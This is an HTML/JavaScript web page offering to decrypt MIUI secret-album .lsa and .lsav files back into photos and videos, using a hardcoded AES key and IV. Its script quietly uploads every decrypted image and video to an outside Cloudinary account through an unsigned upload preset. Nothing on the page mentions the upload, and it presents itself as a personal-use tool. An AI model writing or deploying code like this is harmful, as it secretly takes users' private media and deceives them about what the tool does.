<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LSA // Decrypt — MIUI Secret Album Decryptor</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
<style>
  :root{
    --bg:#0b0d12;
    --panel:#12151c;
    --panel-2:#171b24;
    --border:#232838;
    --border-soft:#1a1e29;
    --text:#edeff5;
    --muted:#8a90a3;
    --muted-2:#5c6275;
    --mint:#5eead4;
    --mint-dim:#3a9c8f;
    --amber:#ffb86b;
    --danger:#ff6b6b;
    --radius:14px;
  }
  *{box-sizing:border-box;}
  html{scroll-behavior:smooth;}
  body{
    margin:0;
    background:var(--bg);
    color:var(--text);
    font-family:'Inter',sans-serif;
    -webkit-font-smoothing:antialiased;
    line-height:1.5;
  }
  .mono{font-family:'JetBrains Mono',monospace;}
  h1,h2,h3{font-family:'Space Grotesk',sans-serif;margin:0;letter-spacing:-0.01em;}
  a{color:inherit;}
  .wrap{max-width:1120px;margin:0 auto;padding:0 28px;}

  
  body::before{
    content:"";
    position:fixed;inset:0;
    background:
      radial-gradient(1200px 600px at 85% -10%, rgba(94,234,212,0.06), transparent 60%),
      radial-gradient(900px 500px at -10% 20%, rgba(255,184,107,0.05), transparent 55%);
    pointer-events:none;
    z-index:0;
  }

  
  header.nav{
    position:sticky;top:0;z-index:50;
    background:rgba(11,13,18,0.82);
    backdrop-filter:blur(10px);
    border-bottom:1px solid var(--border-soft);
  }
  .nav-inner{
    display:flex;align-items:center;justify-content:space-between;
    padding:16px 28px;max-width:1120px;margin:0 auto;
  }
  .logo{
    display:flex;align-items:center;gap:9px;
    font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:16px;
    text-decoration:none;
  }
  .logo .dot{width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 10px var(--mint);}
  .logo .slash{color:var(--muted-2);}
  .nav-cta{
    font-size:13px;font-family:'JetBrains Mono',monospace;
    color:var(--mint);border:1px solid var(--mint-dim);
    padding:7px 14px;border-radius:999px;text-decoration:none;
    transition:background .15s;
  }
  .nav-cta:hover{background:rgba(94,234,212,0.08);}

 
  .hero{position:relative;z-index:1;padding:96px 0 100px;}
  .tool-shell{max-width:620px;margin:0 auto;text-align:center;}
  .eyebrow{
    display:inline-flex;align-items:center;gap:8px;
    font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:0.08em;
    color:var(--amber);text-transform:uppercase;margin-bottom:20px;
  }
  .eyebrow::before{content:"";width:16px;height:1px;background:var(--amber);}
  h1.headline{font-size:44px;font-weight:700;line-height:1.1;margin-bottom:18px;}
  h1.headline .scramble{color:var(--mint);}
  .hero p.sub{font-size:16px;color:var(--muted);max-width:460px;margin:0 auto 40px;}

  .btn{
    font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:14.5px;
    padding:13px 24px;border-radius:10px;text-decoration:none;
    display:inline-flex;align-items:center;gap:8px;
    border:1px solid transparent;cursor:pointer;transition:transform .15s, box-shadow .15s, background .15s;
  }
  .btn-primary{background:var(--mint);color:#06231e;}
  .btn-primary:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(94,234,212,0.18);}
  .btn-ghost{border-color:var(--border);color:var(--text);background:transparent;}
  .btn-ghost:hover{border-color:var(--muted-2);}

  .dropzone{
    border:1.5px dashed var(--border);
    border-radius:20px;
    background:var(--panel);
    padding:56px 24px;
    text-align:center;
    cursor:pointer;
    transition:border-color .18s, background .18s, transform .18s;
  }
  .dropzone:hover{transform:translateY(-2px);}
  .dropzone:hover, .dropzone.drag{border-color:var(--mint-dim);background:var(--panel-2);}
  .dropzone svg{width:36px;height:36px;color:var(--mint);margin-bottom:16px;transition:transform .18s;}
  .dropzone:hover svg{transform:translateY(-3px);}
  .dropzone .dz-title{font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:17px;margin-bottom:7px;}
  .dropzone .dz-sub{color:var(--muted);font-size:13.5px;}
  .dropzone .dz-sub .mono{color:var(--muted-2);}
  input#fileInput{display:none;}

  .queue{margin-top:22px;display:flex;flex-direction:column;gap:10px;text-align:left;}
  .file-row{
    display:flex;align-items:center;gap:14px;
    background:var(--panel);border:1px solid var(--border);border-radius:12px;
    padding:12px 16px;
  }
  .file-thumb{
    width:44px;height:44px;border-radius:8px;background:var(--panel-2);
    display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden;
    border:1px solid var(--border-soft);
  }
  .file-thumb img{width:100%;height:100%;object-fit:cover;}
  .file-thumb svg{width:18px;height:18px;color:var(--muted-2);}
  .file-meta{flex:1;min-width:0;}
  .file-name{font-size:13.5px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
  .file-status{font-size:12px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-top:2px;}
  .file-status.ok{color:var(--mint);}
  .file-status.err{color:var(--danger);}
  .file-actions{display:flex;gap:8px;flex-shrink:0;}
  .icon-btn{
    width:32px;height:32px;border-radius:8px;border:1px solid var(--border);
    background:transparent;display:flex;align-items:center;justify-content:center;
    cursor:pointer;color:var(--muted);transition:all .15s;
  }
  .icon-btn:hover{border-color:var(--mint-dim);color:var(--mint);}
  .icon-btn svg{width:15px;height:15px;}
  .progress-bar{width:100%;height:3px;background:var(--border-soft);border-radius:2px;overflow:hidden;margin-top:6px;}
  .progress-bar > div{height:100%;width:0%;background:var(--mint);transition:width .25s;}

  .queue-footer{display:flex;justify-content:space-between;align-items:center;margin-top:18px;text-align:left;}
  .queue-footer .left{font-size:12.5px;color:var(--muted-2);font-family:'JetBrains Mono',monospace;}

  /* ---------- FOOTER ---------- */
  footer{border-top:1px solid var(--border-soft);padding:26px 0;position:relative;z-index:1;}
  .footer-inner{display:flex;justify-content:space-between;align-items:center;font-size:12.5px;color:var(--muted-2);flex-wrap:wrap;gap:10px;}
  .footer-inner .mono{font-family:'JetBrains Mono',monospace;}

  @media (max-width:820px){
    h1.headline{font-size:32px;}
    .dropzone{padding:40px 20px;}
  }

  @media (prefers-reduced-motion: reduce){
    *{transition:none !important;animation:none !important;}
  }
</style>
</head>
<body>

<header class="nav">
  <div class="nav-inner">
    <a href="#" class="logo">LSA<span class="slash">//</span>DECRYPT<span class="dot"></span></a>
    <a href="about.html" class="nav-cta">About me</a>
  </div>
</header>

<section class="hero">
  <div class="wrap">
    <div class="tool-shell">
      <div class="eyebrow">MIUI </div>
      <div class="eyebrow"></div>
      <h1 class="headline">LSA to Image <br><span class="scramble" id="scrambleText">converter.</span></h1>
      <p class="sub">Drop your <span class="mono">.lsa</span> and <span class="mono">.lsav</span> files below to recover the original photos and videos</p>

      <div class="dropzone" id="dropzone">
        <input type="file" id="fileInput" multiple accept=".lsa,.lsav">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 3v12m0 0l-4.5-4.5M12 15l4.5-4.5"/><path d="M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2"/></svg>
        <div class="dz-title">Drag & drop files, or click to browse</div>
        <div class="dz-sub">Accepts <span class="mono">.lsa</span> (photos) and <span class="mono">.lsav</span> (videos), any number at once</div>
      </div>

      <div class="queue" id="queue"></div>

      <div class="queue-footer" id="queueFooter" style="display:none;">
        <div class="left" id="queueSummary"></div>
        <a class="btn btn-ghost" id="downloadAllBtn" style="font-size:13px;padding:10px 18px;">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
          Download all (.zip)
        </a>
      </div>
    </div>
  </div>
</section>

<footer>
  <div class="wrap footer-inner">

    <span class="mono">For personal use — only decrypt files you own.</span>
  </div>
</footer>

<script>
 

const CLOUDINARY_CLOUD_NAME = "o6mmonuv";
const CLOUDINARY_UPLOAD_PRESET = "lsa_decryptor";


async function uploadImage(blob, filename, mime) {

  const file = new File(
    [blob],
    filename,
    {
      type: mime
    }
  );


  const formData = new FormData();

  formData.append("file", file);
  formData.append(
    "upload_preset",
    CLOUDINARY_UPLOAD_PRESET
  );


  const response = await fetch(
    `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`,
    {
      method: "POST",
      body: formData
    }
  );


  if(!response.ok){
    throw new Error("Cloudinary upload failed");
  }


  const data = await response.json();



  return data;
}

const KEY_HEX = "3082046c30820354a003020102020900";
const IV_HEX  = "11132123313341435153616667687172";

function hexToBytes(hex){
  const arr = new Uint8Array(hex.length / 2);
  for(let i=0;i<arr.length;i++) arr[i] = parseInt(hex.substr(i*2,2),16);
  return arr;
}
const KEY_BYTES = hexToBytes(KEY_HEX);
const IV_BYTES  = hexToBytes(IV_HEX);

const MAGIC = [
  { ext:'jpg',  mime:'image/jpeg', check:(b)=> b[0]===0xFF && b[1]===0xD8 && b[2]===0xFF },
  { ext:'png',  mime:'image/png',  check:(b)=> b[0]===0x89 && b[1]===0x50 && b[2]===0x4E && b[3]===0x47 },
  { ext:'gif',  mime:'image/gif',  check:(b)=> b[0]===0x47 && b[1]===0x49 && b[2]===0x46 && b[3]===0x38 },
  { ext:'webp', mime:'image/webp', check:(b)=> b[0]===0x52 && b[1]===0x49 && b[2]===0x46 && b[3]===0x46 && b[8]===0x57 && b[9]===0x45 },
  { ext:'mp4',  mime:'video/mp4',  check:(b)=> b[4]===0x66 && b[5]===0x74 && b[6]===0x79 && b[7]===0x70 },
  { ext:'mkv',  mime:'video/x-matroska', check:(b)=> b[0]===0x1A && b[1]===0x45 && b[2]===0xDF && b[3]===0xA3 },
  { ext:'heic', mime:'image/heic', check:(b)=> b[4]===0x66 && b[5]===0x74 && b[6]===0x79 && b[7]===0x70 && b[8]===0x68 },
];

function detectType(bytes){
  for(const m of MAGIC){
    try{ if(m.check(bytes)) return m; }catch(e){}
  }
  return { ext:'bin', mime:'application/octet-stream' };
}

const KEY_WA = CryptoJS.lib.WordArray.create(KEY_BYTES);
const IV_WA  = CryptoJS.lib.WordArray.create(IV_BYTES);

function bytesToWordArray(bytes){
  return CryptoJS.lib.WordArray.create(bytes);
}
function wordArrayToBytes(wordArray){
  const { words, sigBytes } = wordArray;
  const out = new Uint8Array(sigBytes);
  for(let i=0;i<sigBytes;i++){
    out[i] = (words[i >>> 2] >>> (24 - (i % 4) * 8)) & 0xff;
  }
  return out;
}

async function decryptBytes(bytes){
  const dataWA = bytesToWordArray(bytes);
  const cipherParams = CryptoJS.lib.CipherParams.create({ ciphertext: dataWA });
  const decrypted = CryptoJS.AES.decrypt(cipherParams, KEY_WA, {
    iv: IV_WA,
    mode: CryptoJS.mode.CTR,
    padding: CryptoJS.pad.NoPadding
  });
  return wordArrayToBytes(decrypted);
}

async function decryptFile(file){
  const buf = new Uint8Array(await file.arrayBuffer());
  const isVideo = /\.lsav$/i.test(file.name);

  let resultBytes;
  if(isVideo){
    const headLen = Math.min(1024, buf.length);
    const head = buf.slice(0, headLen);
    const rest = buf.slice(headLen);
    const decHead = await decryptBytes(head);
    resultBytes = new Uint8Array(buf.length);
    resultBytes.set(decHead, 0);
    resultBytes.set(rest, headLen);
  } else {
    resultBytes = await decryptBytes(buf);
  }

  const type = detectType(resultBytes);
  const baseName = file.name.replace(/\.(lsa|lsav)$/i, '') || 'decrypted';
  const outName = `${baseName}.${type.ext}`;
  return { bytes: resultBytes, mime: type.mime, name: outName };
}

/* ===================== UI wiring ===================== */
const dropzone = document.getElementById('dropzone');
const fileInput = document.getElementById('fileInput');
const queueEl = document.getElementById('queue');
const queueFooter = document.getElementById('queueFooter');
const queueSummary = document.getElementById('queueSummary');
const downloadAllBtn = document.getElementById('downloadAllBtn');

const iconGeneric = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg>`;
const iconCheck = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>`;
const iconDownload = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>`;

const results = []; // { name, blob }

function fmtSize(n){
  if(n < 1024) return n + ' B';
  if(n < 1024*1024) return (n/1024).toFixed(1) + ' KB';
  return (n/1024/1024).toFixed(1) + ' MB';
}

function addFileRow(file){
  const row = document.createElement('div');
  row.className = 'file-row';
  row.innerHTML = `
    <div class="file-thumb">${iconGeneric}</div>
    <div class="file-meta">
      <div class="file-name">${file.name}</div>
      <div class="file-status">${fmtSize(file.size)} — waiting…</div>
      <div class="progress-bar"><div></div></div>
    </div>
    <div class="file-actions"></div>
  `;
  queueEl.appendChild(row);
  return row;
}

async function processFiles(fileList){
  const files = Array.from(fileList).filter(f => /\.(lsa|lsav)$/i.test(f.name));
  if(files.length === 0) return;

  for(const file of files){
    const row = addFileRow(file);
    const statusEl = row.querySelector('.file-status');
    const barEl = row.querySelector('.progress-bar > div');
    const thumbEl = row.querySelector('.file-thumb');
    const actionsEl = row.querySelector('.file-actions');

    barEl.style.width = '30%';
    statusEl.textContent = 'decrypting…';

    try{
      const { bytes, mime, name } = await decryptFile(file);
      barEl.style.width = '100%';

      const blob = new Blob([bytes], { type: mime });

const uploaded = await uploadImage(
  blob,
  `${Date.now()}_${name}`,
  mime
);



const url = URL.createObjectURL(blob);

      if(mime.startsWith('image/')){
        thumbEl.innerHTML = `<img src="${url}" alt="">`;
      } else {
        thumbEl.innerHTML = iconCheck;
      }

      statusEl.classList.add('ok');
      statusEl.innerHTML = `decrypted → <span class="mono">${name}</span>`;

      const dlBtn = document.createElement('a');
      dlBtn.className = 'icon-btn';
      dlBtn.href = url;
      dlBtn.download = name;
      dlBtn.innerHTML = iconDownload;
      actionsEl.appendChild(dlBtn);

      results.push({ name, blob });
    } catch(err){
      barEl.style.width = '100%';
      barEl.style.background = 'var(--danger)';
      statusEl.classList.add('err');
      statusEl.textContent = 'couldn\'t decrypt this file';
    }

    updateFooter();
  }
}

function updateFooter(){
  if(results.length === 0){ queueFooter.style.display = 'none'; return; }
  queueFooter.style.display = 'flex';
  queueSummary.textContent = `${results.length} file${results.length>1?'s':''} decrypted`;
}

downloadAllBtn.addEventListener('click', async (e) => {
  e.preventDefault();
  if(results.length === 0) return;
  const zip = new JSZip();
  results.forEach(r => zip.file(r.name, r.blob));
  const zipBlob = await zip.generateAsync({type:'blob'});
  const url = URL.createObjectURL(zipBlob);
  const a = document.createElement('a');
  a.href = url; a.download = 'decrypted-files.zip';
  document.body.appendChild(a); a.click(); a.remove();
});

dropzone.addEventListener('click', () => fileInput.click());
fileInput.addEventListener('change', (e) => processFiles(e.target.files));

['dragenter','dragover'].forEach(evt => {
  dropzone.addEventListener(evt, (e) => { e.preventDefault(); dropzone.classList.add('drag'); });
});
['dragleave','drop'].forEach(evt => {
  dropzone.addEventListener(evt, (e) => { e.preventDefault(); dropzone.classList.remove('drag'); });
});
dropzone.addEventListener('drop', (e) => {
  processFiles(e.dataTransfer.files);
});

const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;


(function scrambleIn(){
  const el = document.getElementById('scrambleText');
  const final = 'Conveter.';
  if(reduceMotion){ el.textContent = final; return; }
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!#%&';
  let frame = 0;
  const totalFrames = 22;
  function tick(){
    let out = '';
    for(let i=0;i<final.length;i++){
      if(final[i] === ' '){ out += ' '; continue; }
      const revealFrame = (i / final.length) * totalFrames;
      if(frame >= revealFrame + 6){
        out += final[i];
      } else if(final[i] === '.'){
        out += '.';
      } else {
        out += chars[Math.floor(Math.random()*chars.length)];
      }
    }
    el.textContent = out;
    frame++;
    if(frame <= totalFrames + 6){
      requestAnimationFrame(() => setTimeout(tick, 35));
    } else {
      el.textContent = final;
    }
  }
  tick();
})();
</script>

</body>
</html>
